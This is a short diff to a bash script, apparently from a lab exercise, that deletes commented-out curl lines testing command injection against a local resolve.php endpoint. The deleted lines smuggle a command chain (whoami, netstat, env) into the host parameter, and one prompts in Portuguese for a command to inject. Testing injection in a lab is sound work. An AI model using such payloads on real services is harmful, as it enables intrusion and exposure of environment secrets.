@@ -1,7 +1,4 @@
 #!/bin/bash
-#curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;date;whoami;pwd;netstat+-an+|+grep+-i+"ESTABLISHED";env"
-#read -p "Digite o comando que você quer ver: " C
-#curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;$0"
 echo "
 
 
